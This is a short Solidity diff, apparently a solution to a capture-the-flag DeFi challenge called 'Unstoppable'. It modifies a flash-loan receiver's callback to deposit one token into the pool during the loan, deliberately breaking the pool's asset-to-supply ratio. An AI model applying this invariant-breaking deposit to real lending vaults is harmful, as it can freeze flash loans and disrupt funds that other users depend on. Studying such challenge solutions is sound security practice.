@@ -32,6 +32,12 @@ contract ReceiverUnstoppable is Owned, IERC3156FlashBorrower {
             fee != 0
         ) revert UnexpectedFlashLoan();
 
+        // During the flash loan, make a deposit, which will disrupt the asset
+        // to supply ratio.
+        ERC20(token).approve(address(pool), 1);
+        pool.deposit(1, address(this));
+
+        // Return the flash loan
         ERC20(token).approve(address(pool), amount);
 
         return keccak256("IERC3156FlashBorrower.onFlashLoan");
